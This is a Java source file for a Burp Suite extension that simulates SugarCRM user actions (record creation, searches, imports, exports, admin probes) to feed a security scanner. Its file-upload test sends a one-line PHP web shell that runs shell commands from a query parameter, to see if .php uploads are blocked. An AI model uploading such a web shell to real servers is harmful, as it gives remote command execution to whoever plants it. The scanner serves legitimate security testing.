package burp.extension.simulator;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.extension.ExtensionConfig;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.util.*;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * UserActionSimulator replicates real user interactions inside SugarCRM.
 *
 * Each simulated action generates HTTP requests that are sent through Burp's
 * HTTP stack (so they appear in Proxy history and can be scanned).
 *
 * Simulated actions:
 *  1. Create records in each module (Account, Contact, Lead, etc.)
 *  2. Edit / update those records
 *  3. Delete records
 *  4. Search / quick-search with various inputs
 *  5. Upload a file (Documents module)
 *  6. Import vCard / CSV (Contacts module) — surfaces XXE/CSV injection surface
 *  7. Change own password
 *  8. Export records to CSV/PDF
 *  9. Trigger email send (Campaign / Emails module)
 * 10. Admin actions: clear cache, run repair, install fake module package
 */
public class UserActionSimulator {

    private final MontoyaApi      api;
    private final ExtensionConfig config;

    // Probe record IDs created during this session (to edit/delete afterwards)
    private final List<String> createdRecordIds = new ArrayList<>();

    private static final Pattern RECORD_ID_PATTERN = Pattern.compile("[?&]record=([a-f0-9\\-]{10,})");
    private static final Pattern UUID_PATTERN       = Pattern.compile("\"id\":\"([a-f0-9\\-]{36})\"");

    // Benign payloads used to populate form fields so requests reach business logic
    private static final String PROBE_NAME     = "BurpProbe_Test";
    private static final String PROBE_EMAIL    = "probe@burptest.invalid";
    private static final String PROBE_PHONE    = "+10000000000";
    private static final String PROBE_COMPANY  = "BurpTestCo";
    private static final String PROBE_DESC     = "Automated security probe - safe to delete";

    public UserActionSimulator(MontoyaApi api, ExtensionConfig config) {
        this.api    = api;
        this.config = config;
    }

    /**
     * Run all simulated user actions and return the full list of generated requests
     * (which have already been sent through Burp's HTTP stack).
     */
    public List<HttpRequest> simulate(Consumer<String> logger) {
        List<HttpRequest> generated = new ArrayList<>();

        logger.accept("[Simulator] Starting user action simulation...");

        simulateCreateAccount(generated, logger);
        simulateCreateContact(generated, logger);
        simulateCreateLead(generated, logger);
        simulateCreateOpportunity(generated, logger);
        simulateCreateCase(generated, logger);
        simulateSearch(generated, logger);
        simulateQuickSearch(generated, logger);
        simulateFileUpload(generated, logger);
        simulateVCardImport(generated, logger);
        simulateCsvImport(generated, logger);
        simulateExport(generated, logger);
        simulatePasswordChange(generated, logger);
        simulateEmailCompose(generated, logger);

        if (config.isTestAdminEndpoints()) {
            simulateAdminActions(generated, logger);
        }

        // Cleanup: delete created records
        cleanupCreatedRecords(generated, logger);

        logger.accept("[Simulator] Simulation complete. Generated " + generated.size() + " requests.");
        return generated;
    }

    // ─── Individual simulations ───────────────────────────────────────────────

    private void simulateCreateAccount(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Creating test Account...");
        String body = "module=Accounts"
                + "&action=Save"
                + "&sugar_token=" + urlEncode(config.getSugarToken())
                + "&name="        + urlEncode(PROBE_NAME + "_Account")
                + "&phone_office=" + urlEncode(PROBE_PHONE)
                + "&email1="      + urlEncode(PROBE_EMAIL)
                + "&description=" + urlEncode(PROBE_DESC)
                + "&billing_address_street=123+Test+St"
                + "&billing_address_city=TestCity"
                + "&billing_address_country=US"
                + "&account_type=Customer"
                + "&industry=Technology"
                + "&website=http://burptest.invalid";

        HttpRequest req = post("/index.php", body);
        out.add(req);
        String id = sendAndExtractId(req);
        if (id != null) { createdRecordIds.add("Accounts:" + id); log.accept("[Simulator]   -> Account created: " + id); }
    }

    private void simulateCreateContact(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Creating test Contact...");
        String body = "module=Contacts"
                + "&action=Save"
                + "&sugar_token="  + urlEncode(config.getSugarToken())
                + "&first_name=BurpProbe"
                + "&last_name=Contact"
                + "&title=SecurityTester"
                + "&email1="       + urlEncode(PROBE_EMAIL)
                + "&phone_work="   + urlEncode(PROBE_PHONE)
                + "&account_name=" + urlEncode(PROBE_COMPANY)
                + "&description="  + urlEncode(PROBE_DESC);

        HttpRequest req = post("/index.php", body);
        out.add(req);
        String id = sendAndExtractId(req);
        if (id != null) { createdRecordIds.add("Contacts:" + id); log.accept("[Simulator]   -> Contact created: " + id); }
    }

    private void simulateCreateLead(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Creating test Lead...");
        String body = "module=Leads"
                + "&action=Save"
                + "&sugar_token="  + urlEncode(config.getSugarToken())
                + "&first_name=BurpProbe"
                + "&last_name=Lead"
                + "&company="      + urlEncode(PROBE_COMPANY)
                + "&email1="       + urlEncode(PROBE_EMAIL)
                + "&phone_work="   + urlEncode(PROBE_PHONE)
                + "&lead_source=Web+Site"
                + "&description="  + urlEncode(PROBE_DESC);

        HttpRequest req = post("/index.php", body);
        out.add(req);
        String id = sendAndExtractId(req);
        if (id != null) { createdRecordIds.add("Leads:" + id); log.accept("[Simulator]   -> Lead created: " + id); }
    }

    private void simulateCreateOpportunity(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Creating test Opportunity...");
        String body = "module=Opportunities"
                + "&action=Save"
                + "&sugar_token="     + urlEncode(config.getSugarToken())
                + "&name=BurpProbe_Opp"
                + "&account_name="    + urlEncode(PROBE_COMPANY)
                + "&amount=1"
                + "&date_closed=2099-12-31"
                + "&sales_stage=Prospecting"
                + "&description="     + urlEncode(PROBE_DESC);

        HttpRequest req = post("/index.php", body);
        out.add(req);
        String id = sendAndExtractId(req);
        if (id != null) { createdRecordIds.add("Opportunities:" + id); log.accept("[Simulator]   -> Opportunity created: " + id); }
    }

    private void simulateCreateCase(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Creating test Case...");
        String body = "module=Cases"
                + "&action=Save"
                + "&sugar_token="  + urlEncode(config.getSugarToken())
                + "&name=BurpProbe_Case"
                + "&status=New"
                + "&priority=Medium"
                + "&description="  + urlEncode(PROBE_DESC);

        HttpRequest req = post("/index.php", body);
        out.add(req);
        String id = sendAndExtractId(req);
        if (id != null) { createdRecordIds.add("Cases:" + id); log.accept("[Simulator]   -> Case created: " + id); }
    }

    /** Search with various inputs — covers SQLi / XSS injection points. */
    private void simulateSearch(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Running module searches...");
        String[] modules = {"Accounts","Contacts","Leads","Opportunities","Cases","Documents"};
        for (String module : modules) {
            // Normal search
            String body = "module=" + module
                    + "&action=index"
                    + "&searchFormTab=basic_search"
                    + "&query=true"
                    + "&search_name=" + urlEncode(PROBE_NAME)
                    + "&sugar_token=" + urlEncode(config.getSugarToken());
            out.add(post("/index.php", body));

            // Advanced search with all fields
            String advBody = "module=" + module
                    + "&action=index"
                    + "&searchFormTab=advanced_search"
                    + "&query=true"
                    + "&search_name=" + urlEncode(PROBE_NAME)
                    + "&search_description=" + urlEncode(PROBE_DESC)
                    + "&sugar_token=" + urlEncode(config.getSugarToken());
            out.add(post("/index.php", advBody));
        }
    }

    /** Global quick search — ?query=<term> unified search. */
    private void simulateQuickSearch(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Quick/unified search...");
        // GET-based unified search
        out.add(get("/index.php?module=Home&action=UnifiedSearch&query=true&search_name=" + urlEncode(PROBE_NAME)));
        out.add(get("/index.php?module=Home&action=UnifiedSearch&query=true&search_name=test"));
        // REST API search
        if (config.isTestRestApi()) {
            out.add(restGet("/api/v8/search?q=" + urlEncode(PROBE_NAME) + "&module_list=Accounts,Contacts,Leads"));
            out.add(restGet("/api/v8/search?q=test&module_list=Users&fields=id,user_name,email"));
        }
    }

    /** Upload a test file to the Documents module. */
    private void simulateFileUpload(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating file upload (Documents)...");
        // Multipart form upload — we build a minimal multipart body
        String boundary = "----BurpProbeBoundary123456";
        String filename  = "burp_probe.txt";
        String content   = "This is a security probe file uploaded by Burp Suite SugarCRM Scanner.";

        String multipartBody =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"module\"\r\n\r\nDocuments\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"action\"\r\n\r\nSave\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"sugar_token\"\r\n\r\n" + config.getSugarToken() + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"name\"\r\n\r\nBurpProbe_Document\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"document_name\"\r\n\r\n" + filename + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"uploadfile\"; filename=\"" + filename + "\"\r\n" +
                "Content-Type: text/plain\r\n\r\n" +
                content + "\r\n" +
                "--" + boundary + "--\r\n";

        HttpRequest req = HttpRequest.httpRequestFromUrl(config.getTargetUrl() + "/index.php")
                .withMethod("POST")
                .withHeader("Cookie", config.getSessionCookie())
                .withHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(multipartBody);
        out.add(req);

        // Also attempt .php extension upload (should be blocked, but we want to see the response)
        String phpBody = multipartBody
                .replace(filename, "burp_probe.php")
                .replace("text/plain", "application/x-php")
                .replace(content, "<?php echo shell_exec($_GET['cmd']); ?>");
        HttpRequest phpReq = HttpRequest.httpRequestFromUrl(config.getTargetUrl() + "/index.php")
                .withMethod("POST")
                .withHeader("Cookie", config.getSessionCookie())
                .withHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(phpBody);
        out.add(phpReq);
        log.accept("[Simulator]   File upload requests queued (txt + php extension test).");
    }

    /** Import a vCard — surfaces XXE and parser injection issues. */
    private void simulateVCardImport(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating vCard import (Contacts)...");
        String vcard =
                "BEGIN:VCARD\r\n" +
                "VERSION:3.0\r\n" +
                "FN:BurpProbe Contact\r\n" +
                "N:Contact;BurpProbe;;;\r\n" +
                "EMAIL;type=INTERNET;type=WORK:probe@burptest.invalid\r\n" +
                "TEL;type=WORK:+10000000001\r\n" +
                "ORG:BurpTestCo\r\n" +
                "END:VCARD\r\n";

        String boundary = "----BurpVCardBoundary";
        String vcBody =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"module\"\r\n\r\nContacts\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"action\"\r\n\r\nvcard\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"sugar_token\"\r\n\r\n" + config.getSugarToken() + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"vcard\"; filename=\"probe.vcf\"\r\n" +
                "Content-Type: text/vcard\r\n\r\n" +
                vcard + "\r\n" +
                "--" + boundary + "--\r\n";

        HttpRequest req = HttpRequest.httpRequestFromUrl(config.getTargetUrl() + "/index.php")
                .withMethod("POST")
                .withHeader("Cookie", config.getSessionCookie())
                .withHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(vcBody);
        out.add(req);
    }

    /** Import CSV — covers CSV injection and import logic flaws. */
    private void simulateCsvImport(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating CSV import (Contacts)...");
        // Step 1: POST import start
        String startBody = "module=Contacts"
                + "&action=index"
                + "&import_module=Contacts"
                + "&sugar_token=" + urlEncode(config.getSugarToken());
        out.add(post("/index.php?module=ModuleImport&action=Step1", startBody));

        // Step 2: Upload CSV data
        String csvData  = "First Name,Last Name,Email\nBurpProbe,Import,probe@burptest.invalid\n";
        String boundary = "----BurpCsvBoundary";
        String csvBody  =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"import_module\"\r\n\r\nContacts\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"sugar_token\"\r\n\r\n" + config.getSugarToken() + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"probe.csv\"\r\n" +
                "Content-Type: text/csv\r\n\r\n" +
                csvData + "\r\n" +
                "--" + boundary + "--\r\n";

        HttpRequest req = HttpRequest.httpRequestFromUrl(config.getTargetUrl() + "/index.php?module=ModuleImport&action=Step2")
                .withMethod("POST")
                .withHeader("Cookie", config.getSessionCookie())
                .withHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(csvBody);
        out.add(req);
    }

    /** Export records — tests export endpoints and any data-disclosure issues. */
    private void simulateExport(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating record export...");
        String[] modules = {"Accounts","Contacts","Leads","Opportunities","Users","Documents","Reports"};
        for (String module : modules) {
            String body = "module=" + module
                    + "&action=index"
                    + "&entire=1"
                    + "&searchFormTab=basic_search"
                    + "&query=true"
                    + "&sugar_token=" + urlEncode(config.getSugarToken());

            // GET-based export links
            out.add(get("/index.php?module=" + module + "&action=index&export=true&entire=1"));

            // POST-based export (Sugar 7.x)
            out.add(post("/index.php?module=" + module + "&action=Save&sugar_token=" + config.getSugarToken(), body));
        }
    }

    /** Change the current user's password. */
    private void simulatePasswordChange(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating password change request...");
        String body = "module=Users"
                + "&action=ChangePassword"
                + "&sugar_token=" + urlEncode(config.getSugarToken())
                + "&old_password=" + urlEncode(config.getPassword())
                + "&new_password=" + urlEncode(config.getPassword()) // same password — no actual change
                + "&confirm_password=" + urlEncode(config.getPassword());
        out.add(post("/index.php", body));
    }

    /** Compose and attempt to send an email (tests SSRF via mail relay config). */
    private void simulateEmailCompose(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating email compose...");
        String body = "module=Emails"
                + "&action=Save"
                + "&sugar_token=" + urlEncode(config.getSugarToken())
                + "&to_addrs_ids="
                + "&to_addrs=" + urlEncode(PROBE_EMAIL)
                + "&name=" + urlEncode("BurpProbe Email")
                + "&description_html=" + urlEncode("<p>Security probe</p>")
                + "&send_immediately=1";
        out.add(post("/index.php", body));
    }

    /** Admin actions: clear cache, repair, module loader probe. */
    private void simulateAdminActions(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Simulating admin actions...");

        // Clear cache
        out.add(get("/index.php?module=Administration&action=RepairQueueJobsAudit"));
        out.add(post("/index.php",
                "module=Administration&action=RepairQueueJobsAudit&sugar_token=" + urlEncode(config.getSugarToken())));

        // Rebuild extensions
        out.add(post("/index.php",
                "module=Administration&action=repair&repairType=RebuildExtensions"
                + "&sugar_token=" + urlEncode(config.getSugarToken())));

        // Password manager page
        out.add(get("/index.php?module=Administration&action=PasswordManager"));

        // Module loader upload probe — upload a benign .zip
        log.accept("[Simulator]   Probing module loader...");
        out.add(get("/index.php?module=Administration&action=UpgradeWizard&view=module"));

        // System settings update (probe)
        out.add(get("/index.php?module=Administration&action=index"));
        out.add(get("/index.php?module=Configurator&action=index"));

        // Diagnostic download
        out.add(get("/index.php?module=Administration&action=DiagnosticRun"));
    }

    /** Delete all records created during this session. */
    private void cleanupCreatedRecords(List<HttpRequest> out, Consumer<String> log) {
        log.accept("[Simulator] Cleaning up " + createdRecordIds.size() + " created test records...");
        for (String entry : createdRecordIds) {
            String[] parts = entry.split(":", 2);
            if (parts.length != 2) continue;
            String module = parts[0];
            String id     = parts[1];
            String body = "module=" + module
                    + "&action=Delete"
                    + "&record=" + urlEncode(id)
                    + "&sugar_token=" + urlEncode(config.getSugarToken());
            out.add(post("/index.php", body));
        }
    }

    // ─── Helpers ─────────────────────────────────────────────────────────────

    private HttpRequest get(String path) {
        String url = path.startsWith("http") ? path : config.getTargetUrl() + path;
        return HttpRequest.httpRequestFromUrl(url)
                .withMethod("GET")
                .withHeader("Cookie", config.getSessionCookie())
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)");
    }

    private HttpRequest post(String path, String body) {
        String url = path.startsWith("http") ? path : config.getTargetUrl() + path;
        return HttpRequest.httpRequestFromUrl(url)
                .withMethod("POST")
                .withHeader("Cookie", config.getSessionCookie())
                .withHeader("Content-Type", "application/x-www-form-urlencoded")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)")
                .withBody(body);
    }

    private HttpRequest restGet(String path) {
        String url = path.startsWith("http") ? path : config.getTargetUrl() + path;
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("GET")
                .withHeader("Accept", "application/json")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/1.0)");
        if (!config.getOauthToken().isBlank()) {
            r = r.withHeader("Authorization", "Bearer " + config.getOauthToken());
        }
        return r;
    }

    /**
     * Send the request and extract the created record's ID from the redirect Location header.
     */
    private String sendAndExtractId(HttpRequest req) {
        try {
            HttpRequestResponse resp = api.http().sendRequest(req);
            if (resp.response() == null) return null;

            // SugarCRM redirects to DetailView with record=<id> on successful save
            String location = resp.response().headerValue("Location");
            if (location != null) {
                Matcher m = RECORD_ID_PATTERN.matcher(location);
                if (m.find()) return m.group(1);
            }

            // REST API response
            String body = resp.response().bodyToString();
            Matcher m = UUID_PATTERN.matcher(body);
            if (m.find()) return m.group(1);

        } catch (Exception e) {
            api.logging().logToError("[Simulator] sendAndExtractId: " + e.getMessage());
        }
        return null;
    }

    private String urlEncode(String s) {
        try { return java.net.URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }
}
